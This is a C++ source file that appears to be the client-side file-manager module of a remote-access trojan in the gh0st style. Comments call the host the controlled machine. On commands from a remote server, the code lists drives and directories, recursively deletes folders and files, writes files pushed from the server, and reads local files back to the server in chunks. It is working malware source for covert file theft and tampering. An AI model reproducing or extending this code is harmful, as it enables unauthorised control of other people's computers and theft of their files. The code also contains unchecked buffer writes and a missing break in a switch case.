#include "FileManager.h"
#include "Common.h"


CFileManager::CFileManager(_CIOCPClient * IOCPClient) :CManager(IOCPClient)
{
	printf("CFileManager()\r\n");
	m_TransferMode = TRANSFER_MODE_NORMAL;
	SendClientVolumeList();
}

CFileManager::~CFileManager()
{
	printf("~CFileManager()\r\n");
}

VOID CFileManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_FILE_MANAGER_FILE_LIST:
	{
		SendClientFilesList((PBYTE)BufferData + 1);   //第一个字节是消息 后面的是路径
		break;
	}
	
	case CLIENT_FILE_MANAGER_NEW_FLODER:
	{
		CreateNewFloder((PBYTE)BufferData + 1, BufferLength - 1);
		break;
	}
	case CLIENT_FILE_MANAGER_DELETE_FLODER:
	{
		int Token = CLIENT_FILE_MANAGER_DELETE_REPLY;
		BOOL IsOk = DeleteDirectory((LPCTSTR)BufferData + 1);	
		char* Data = new char[5];
		memset(Data, 0, 5);
		memcpy(Data, &Token, sizeof(BYTE));
		memcpy(Data + 1, &IsOk, sizeof(BOOL));
		m_IOCPClient->OnSending(Data, sizeof(BOOL) + sizeof(BYTE));
		if (Data != NULL)
		{
			delete[] Data;
			Data = NULL;
		}
		break;
	}
	case CLIENT_FILE_MANAGER_DELETE_FILE:
	{
		int Token = CLIENT_FILE_MANAGER_DELETE_REPLY;
		BOOL IsOk = DeleteFile((LPCTSTR)BufferData + 1);
		char* Data = new char[5];
		memset(Data, 0, 5);
		memcpy(Data, &Token, sizeof(BYTE));
		memcpy(Data + 1, &IsOk, sizeof(BOOL));
		m_IOCPClient->OnSending(Data, sizeof(BOOL) + sizeof(BYTE));
		if (Data != NULL)
		{
			delete[] Data;
			Data = NULL;
		}
		break;
	}
	case CLIENT_FILE_MANAGER_SEND_FILE_INFORMATION:
	{
		//服务端向客户端传送数据
		//创建客户端接受文件
		CreateClientReceiveFileInfo(BufferData + 1);
	}
	case CLIENT_FILE_MANAGER_SET_TRANSFER_MODE:
	{
		SetTransferMode(BufferData + 1);
		break;
	}
	case CLIENT_FILE_MANAGER_FILE_DATA:
	{
		WriteClientReceiveFile(BufferData + 1, BufferLength - 1);
		break;
	}
	//服务器要从客户端拷贝一个文件夹 所以要把文件夹所有文件路径发送给服务器
	case CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH:
	{
		FixedClientToServerDirectory((char*)(BufferData + 1));
		break;
	}
	//获得需要拷贝到服务器的文件的文件路径
	case CLIENT_FILE_MANAGER_SEND_COPY_FILE_INFORMATION_FROM_CLIENT:
	{

		GetTheFileInfo(BufferData + 1, BufferLength - 1);
		break;
	}
	//需要发送文件数据到客户端
	case CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER:
	{
		SendFileData(BufferData + 1);
		break;
	}
	}
}
//获得被控端的磁盘信息
ULONG CFileManager::SendClientVolumeList()             
{
	char	VolumeListData[0x500] = { 0 };
	// 前一个字节为消息类型，后面的52字节为驱动器跟相关属性
	BYTE	BufferData[0x1000] = { 0 };
	char	FileSystemInfo[MAX_PATH] = { 0 };
	char	*Travel = NULL;
	BufferData[0] = CLIENT_FILE_MANAGER_REPLY;    
	// 驱动器列表
	GetLogicalDriveStrings(sizeof(VolumeListData), VolumeListData);

	Travel = VolumeListData;
	//获得驱动器的信息
	unsigned __int64	HardDiskAmount = 0;   //HardDisk
	unsigned __int64	HardDiskFreeSpace = 0;
	unsigned long		HardDiskAmountMB = 0;   // 总大小
	unsigned long		HardDiskFreeSpaceMB = 0;   // 剩余空间
												  
	//注意这里的dwOffset不能从0 因为0单位存储的是消息类型
	DWORD Offset = 0;
	for (Offset = 1; *Travel != '\0'; Travel += lstrlen(Travel) + 1)//这里的+1为了过\0
	{
		memset(FileSystemInfo, 0, sizeof(FileSystemInfo));  //文件系统 NTFS

		// 得到文件系统信息及大小到FileSystemInfo
		GetVolumeInformation(Travel, NULL, 0, NULL, NULL, NULL, FileSystemInfo, MAX_PATH);
		ULONG	FileSystemLength = lstrlen(FileSystemInfo) + 1;

		SHFILEINFO	v1;
		SHGetFileInfo(Travel, FILE_ATTRIBUTE_NORMAL, &v1,
			sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		ULONG HardDiskTypeNameLength = lstrlen(v1.szTypeName) + 1;
		// 计算磁盘大小
		if (Travel[0] != 'A' && Travel[0] != 'B'
			&& GetDiskFreeSpaceEx(Travel, (PULARGE_INTEGER)&HardDiskFreeSpace,
			(PULARGE_INTEGER)&HardDiskAmount, NULL))
		{
			HardDiskAmountMB = HardDiskAmount / 1024 / 1024;         //这里获得是字节要转换成G
			HardDiskFreeSpaceMB = HardDiskFreeSpace / 1024 / 1024;
		}
		else
		{
			HardDiskAmountMB = 0;
			HardDiskFreeSpaceMB = 0;
		}
		// 开始赋值


		BufferData[Offset] = Travel[0];                       //盘符
		BufferData[Offset + 1] = GetDriveType(Travel);        //驱动器的类型
															  // 磁盘空间描述占去了8字节
		memcpy(BufferData + Offset + 2, &HardDiskAmountMB, sizeof(unsigned long));
		memcpy(BufferData + Offset + 6, &HardDiskFreeSpaceMB, sizeof(unsigned long));

		//0                       1  2       4  4
		//TOKEN_VOLUME_DEVICE_LISTC驱动器类型5030
		// 磁盘卷标名及磁盘类型
		memcpy(BufferData + Offset + 10, v1.szTypeName, HardDiskTypeNameLength);
		memcpy(BufferData + Offset + 10 + HardDiskTypeNameLength, FileSystemInfo,
			FileSystemLength);

		Offset += 10 + HardDiskTypeNameLength + FileSystemLength;
	}
	return 	m_IOCPClient->OnSending((char*)BufferData, Offset);
}
//获得被控端的文件数据
int CFileManager::SendClientFilesList(PBYTE DirectoryPath)
{
	// 重置传输方式
	//m_TransferMode = TRANSFER_MODE_NORMAL;


	DWORD	Offset = 0; // 位移指针
	char*   BufferData = NULL;
	ULONG   BufferLength = 1024 * 10; // 先分配10K的缓冲区

	BufferData = (char*)LocalAlloc(LPTR, BufferLength);
	if (BufferData == NULL)
	{
		return 0;
	}
	char v1[MAX_PATH];

	wsprintf(v1, "%s\\*.*", DirectoryPath);
	//szDirectoryFullPath = D:\\*.*

	HANDLE FileHandle = INVALID_HANDLE_VALUE;
	WIN32_FIND_DATA	wfd;
	FileHandle = FindFirstFile(v1, &wfd);

	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		BYTE IsToken = CLIENT_FILE_MANAGER_FILE_LIST_REPLY;

		if (BufferData != NULL)
		{
			LocalFree(BufferData);
			BufferData = NULL;
		}
		return m_IOCPClient->OnSending((char*)&IsToken, 1);
	}
	BufferData[0] = CLIENT_FILE_MANAGER_FILE_LIST_REPLY;
	// 1 为数据包头部所占字节,最后赋值
	Offset = 1;

	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/

	do
	{
		// 动态扩展缓冲区
		if (Offset > (BufferLength - MAX_PATH * 2))
		{
			BufferLength += MAX_PATH * 2;
			BufferData = (char*)LocalReAlloc(BufferData,
				BufferLength, LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		char* FileName = wfd.cFileName;
		if (strcmp(FileName, ".") == 0 || strcmp(FileName, "..") == 0)
			continue;
		// 文件属性 1 字节

		//[Flag 1 HelloWorld\0大小 大小 时间 时间 
		//      0 1.txt\0 大小 大小 时间 时间]
		*(BufferData + Offset) = wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY;   //1  0 
		Offset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		ULONG FileNameLength = strlen(FileName);
		memcpy(BufferData + Offset, FileName, FileNameLength);
		Offset += FileNameLength;
		*(BufferData + Offset) = 0;
		Offset++;

		// 文件大小 8 字节
		memcpy(BufferData + Offset, &wfd.nFileSizeHigh, sizeof(DWORD));
		memcpy(BufferData + Offset + 4, &wfd.nFileSizeLow, sizeof(DWORD));
		Offset += 8;
		// 最后访问时间 8 字节
		memcpy(BufferData + Offset, &wfd.ftLastWriteTime, sizeof(FILETIME));
		Offset += 8;
	} while (FindNextFile(FileHandle, &wfd));

	ULONG v7 = m_IOCPClient->OnSending(BufferData, Offset);
	LocalFree(BufferData);
	FindClose(FileHandle);
	return v7;
}
//创建新的文件夹
VOID CFileManager::CreateNewFloder(PBYTE BufferData, ULONG BufferLength)
{
	int Token = CLIENT_FILE_MANAGER_NEW_FLODER_REPLY;
	BOOL IsOk = MakeSureDirectoryPathExists((char*)BufferData);

	char* Data = new char[5];
	memset(Data, 0, 5);
	memcpy(Data, &Token, sizeof(BYTE));
	memcpy(Data + 1, &IsOk, sizeof(BOOL));
	m_IOCPClient->OnSending(Data, sizeof(BOOL) + sizeof(BYTE));
	if (Data != NULL)
	{
		delete[] Data;
		Data = NULL;
	}
}
//创建多层目录
BOOL CFileManager::MakeSureDirectoryPathExists(char* DirectoryFullPath)
{
	char* Travel = NULL;
	char* BufferData = NULL;
	DWORD DirectoryAttributes;
	__try
	{
		BufferData = (char*)malloc(sizeof(char)*(strlen(DirectoryFullPath) + 1));
		if (BufferData == NULL)
		{
			return FALSE;
		}
		strcpy(BufferData, DirectoryFullPath);
		Travel = BufferData;
		if (*(Travel + 1) == ':')
		{
			Travel++;
			Travel++;
			if (*Travel && (*Travel == '\\'))
			{
				Travel++;
			}
		}
		//深层目录
		while (*Travel)           //D:\Hello\\World\Shit\0
		{
			if (*Travel == '\\')
			{
				*Travel = '\0';
				DirectoryAttributes = GetFileAttributes(BufferData);   //查看是否是否目录  目录存在吗
				if (DirectoryAttributes == 0xffffffff)
				{
					if (!CreateDirectory(BufferData, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(BufferData);
							return FALSE;
						}
					}
				}
				else
				{
					if ((DirectoryAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(BufferData);
						BufferData = NULL;
						return FALSE;
					}
				}

				*Travel = '\\';
			}

			Travel = CharNext(Travel);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		if (BufferData != NULL)
		{
			free(BufferData);
			BufferData = NULL;
		}
		return FALSE;
	}
	if (BufferData != NULL)
	{
		free(BufferData);
		BufferData = NULL;
	}
	return TRUE;
}
//删除文件（夹）
BOOL CFileManager::DeleteDirectory(LPCTSTR DirectoryFullPath)
{
	WIN32_FIND_DATA	wfd;
	char	BufferData[MAX_PATH] = { 0 };

	wsprintf(BufferData, "%s\\*.*", DirectoryFullPath);

	HANDLE FileHandle = FindFirstFile(BufferData, &wfd);
	if (FileHandle == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;

	do
	{
		if (wfd.cFileName[0] == '.'&&strlen(wfd.cFileName) <= 2)
		{
			continue;
		}
		else
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char v1[MAX_PATH];
				wsprintf(v1, "%s\\%s", DirectoryFullPath, wfd.cFileName);
				DeleteDirectory(v1);
			}
			else
			{
				char v1[MAX_PATH];
				wsprintf(v1, "%s\\%s", DirectoryFullPath, wfd.cFileName);
				DeleteFile(v1);
			}
		}
	} while (FindNextFile(FileHandle, &wfd));

	FindClose(FileHandle); // 关闭查找句柄

	if (!RemoveDirectory(DirectoryFullPath))
	{
		return FALSE;
	}
	return TRUE;
}

VOID CFileManager::CreateClientReceiveFileInfo(LPBYTE BufferData)
{
	//	//[Flag 0001 0001 E:\1.txt\0 ]
	FILE_SIZE*	v1 = (FILE_SIZE*)BufferData;
	// 保存当前正在操作的文件名
	memset(m_FileFullPath, 0,
		sizeof(m_FileFullPath));
	strcpy(m_FileFullPath, (char *)BufferData + 8);  //已经越过消息头了
										             // 保存文件长度
	m_OperatingFileLength =
		(v1->FileSizeHigh * (MAXDWORD + 1)) + v1->FileSizeLow;

	// 创建多层目录
	MakeSureDirectoryPathExists(m_FileFullPath);

	WIN32_FIND_DATA wfa;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &wfa);


	//1 2 3         1  2 3
	if (FileHandle != INVALID_HANDLE_VALUE
		&& m_TransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_TransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		//如果有相同的文件

		BYTE	IsToken[1];
		IsToken[0] = CLIENT_FILE_MANAGER_TRANSFER_MODE_REQUIRE;
		m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));
	}
	else
	{
		GetServerFileData();                      //如果没有相同的文件就会执行到这里
	}
	FindClose(FileHandle);
}

VOID CFileManager::SetTransferMode(LPBYTE BufferData)
{
	memcpy(&m_TransferMode, BufferData, sizeof(m_TransferMode));
	GetServerFileData();
}

VOID CFileManager::GetServerFileData()
{
	int	iTransferMode;
	switch (m_TransferMode)   //如果没有相同的数据是不会进入Case中的
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		iTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		iTransferMode = TRANSFER_MODE_JUMP;   //CreateFile（always open——eixt）
		break;
	default:
		iTransferMode = m_TransferMode; //1.  2 3
	}

	WIN32_FIND_DATA wfa;
	HANDLE FileHandle = FindFirstFile(m_FileFullPath, &wfa);

	//1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	IsToken[9] = { 0 };
	DWORD	CreationDisposition; // 文件打开方式 
	memset(IsToken, 0, sizeof(IsToken));
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;
	// 文件已经存在
	if (FileHandle != INVALID_HANDLE_VALUE)
	{

		// 覆盖
		if (iTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			//偏移置0
			memset(IsToken + 1, 0, 8);//0000 0000
									 // 重新创建
			CreationDisposition = CREATE_ALWAYS;    //进行覆盖   
		}
		// 传送下一个
		else if (iTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD v1 = -1;  //0000 -1
			memcpy(IsToken + 5, &v1, 4);
			CreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		memset(IsToken + 1, 0, 8);  //0000 0000              //没有相同的文件会走到这里
								   // 重新创建
		CreationDisposition = CREATE_ALWAYS;    //创建一个新的文件
	}
	FindClose(FileHandle);

	FileHandle =
		CreateFile
		(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			CreationDisposition,  
			FILE_ATTRIBUTE_NORMAL,
			0
		);
	// 需要错误处理
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		m_OperatingFileLength = 0;
		return;
	}
	CloseHandle(FileHandle);

	m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));
}

VOID CFileManager::WriteClientReceiveFile(LPBYTE BufferData, ULONG BufferLength)
{
	BYTE	*Travel;
	DWORD	NumberOfBytesToWrite = 0;
	DWORD	NumberOfBytesWirte = 0;
	int		v3 = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILE_SIZE* v1;
	// 得到数据的偏移
	Travel = BufferData + 8;

	v1 = (FILE_SIZE *)BufferData;

	// 得到数据在文件中的偏移

	LONG	OffsetHigh = v1->FileSizeHigh;
	LONG	OffsetLow = v1->FileSizeLow;

	NumberOfBytesToWrite = BufferLength - 8;

	HANDLE	FileHandle =
		CreateFile
		(
			m_FileFullPath,
			GENERIC_WRITE,
			FILE_SHARE_WRITE,
			NULL,
			OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL,
			0
		);

	SetFilePointer(FileHandle, OffsetLow, &OffsetHigh, FILE_BEGIN);

	// 写入文件
	WriteFile
	(
		FileHandle,
		Travel,
		NumberOfBytesToWrite,
		&NumberOfBytesWirte,
		NULL
	);

	CloseHandle(FileHandle);
	BYTE	IsToken[9];
	IsToken[0] = CLIENT_FILE_MANAGER_FILE_DATA_CONTINUE;//TOKEN_DATA_CONTINUE
	OffsetLow += NumberOfBytesWirte;
	memcpy(IsToken + 1, &OffsetHigh, sizeof(OffsetHigh));
	memcpy(IsToken + 5, &OffsetLow, sizeof(OffsetLow));
	m_IOCPClient->OnSending((char*)&IsToken, sizeof(IsToken));

}


/*************************  客户端向服务器拖拽文件         *********************/
BOOL CFileManager::FixedClientToServerDirectory(char* DircetoryFullPath)
{
	CHAR BufferData[MAX_PATH];

	memset(BufferData, 0, sizeof(BufferData));

	sprintf(BufferData, "%s*.*", DircetoryFullPath);
	//BufferData例子：  D:\Hello\*.*

	//查找文件夹下的文件

	WIN32_FIND_DATA	wfd;
	//第一次查找
	HANDLE FileHandle = FindFirstFile(BufferData, &wfd);

	//如果没有找到或查找失败
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	
	do
	{
		if (((wfd.cFileName[0] == '.') && (strlen(wfd.cFileName) == 1)) ||
			((wfd.cFileName[0] == '.') && (wfd.cFileName[1] == '.') && (strlen(wfd.cFileName) == 2)))
		{
			continue; // 过滤这两个目录 '.'和'..'
		}
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			CHAR v1[MAX_PATH];
			sprintf(v1, "%s%s", DircetoryFullPath, wfd.cFileName);
			FixedClientToServerDirectory(v1); // 如果找到的是目录，则进入此目录进行递归 
		}
		else
		{
			CHAR FileFullPath[MAX_PATH];
			memset(FileFullPath, 0, MAX_PATH);
			FileFullPath[0] = CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH_REPLY;
			sprintf(FileFullPath+1, "%s%s", DircetoryFullPath, wfd.cFileName);
			m_IOCPClient->OnSending(FileFullPath, MAX_PATH);

		}
	} while (FindNextFile(FileHandle, &wfd));

	FindClose(FileHandle); // 关闭查找句柄
	BYTE IsToken = CLIENT_FILE_MANAGER_SEND_COPY_DIRECTORY_FILEFULLPATH_END;
	m_IOCPClient->OnSending((char*)&IsToken, 1);
	return true;
}

VOID CFileManager::GetTheFileInfo(PBYTE BufferData, int BufferLength)
{
	DWORD	SizeHigh;
	DWORD	SizeLow;
	//获得文件路径
	memset(m_FileFullPath, 0, sizeof(m_FileFullPath));
	memcpy(m_FileFullPath, BufferData, BufferLength);

	//打开文件 计算文件大小
	HANDLE FileHandle = CreateFile((LPCSTR)m_FileFullPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return;
	}
	SizeLow = GetFileSize(FileHandle, &SizeHigh);

	//当前操作文件总大小
	m_OperatingFileLength = (SizeHigh * (MAXDWORD + 1)) + SizeLow;

	BYTE IsToken[9] = { 0 };
	IsToken[0] = CLIENT_FILE_MANAGER_SEND_COPY_FILE_INFORMATION_FROM_CLIENT_REPLY;
	memcpy(&IsToken[1], &m_OperatingFileLength, 8);
	m_IOCPClient->OnSending((char*)IsToken, 9);

	CloseHandle(FileHandle);
}

//发送文件数据
VOID CFileManager::SendFileData(PBYTE BufferData)
{
	FILE_SIZE* v1 = (FILE_SIZE *)(BufferData);

	//数据在文件中的偏移
	LONG	OffsetHigh = v1->FileSizeHigh;
	LONG	OffsetLow = v1->FileSizeLow;

	//通过偏移计算已经拷贝的长度
	m_Counter = MAKEINT64(v1->FileSizeLow, v1->FileSizeHigh);

	//SizeLow == -1  是选择了跳过此文件 
	//m_nCounter == m_OperatingFileLengthFromClient  是完成了当前的传输
	if (m_Counter == m_OperatingFileLength || v1->FileSizeLow == -1)
	{
		//单个文件传输完成 
		BYTE IsToken = CLIENT_FILE_MANAGER_ONE_COPY_FILE_SUCCESS;
		m_IOCPClient->OnSending((char*)&IsToken, 1);
		return;
	}
	//打开文件
	HANDLE	FileHandle;
	FileHandle = CreateFile((LPCSTR)(m_FileFullPath), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (FileHandle == INVALID_HANDLE_VALUE)
	{
		return;
	}

	//定位文件指针到需要读取的新数据处  
	SetFilePointer(FileHandle, OffsetLow, &OffsetHigh, FILE_BEGIN);

	int		v3 = 9; // 1 + 4 + 4  数据包头部大小，为固定的9


	DWORD	NumberOfBytesToRead = MAX_SEND_BUFFER - v3;
	DWORD	NumberOfBytesRead = 0;

	BYTE	*SendBufferData = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);

	if (SendBufferData == NULL)
	{
		CloseHandle(FileHandle);
		return;
	}

	SendBufferData[0] = CLIENT_FILE_MANAGER_COPY_FILE_DATA_TO_SERVER_REPLY;
	//数据在文件中的偏移
	memcpy(SendBufferData + 1, &OffsetHigh, sizeof(OffsetHigh));
	memcpy(SendBufferData + 5, &OffsetLow, sizeof(OffsetLow));
	//读取文件信息
	ReadFile(FileHandle, SendBufferData + v3, NumberOfBytesToRead, &NumberOfBytesRead, NULL);
	CloseHandle(FileHandle);

	//发送文件数据
	if (NumberOfBytesRead > 0)
	{
		ULONG	BufferLength = NumberOfBytesRead + v3;
		m_IOCPClient->OnSending((char*)SendBufferData, BufferLength);
	}
	LocalFree(SendBufferData);
}
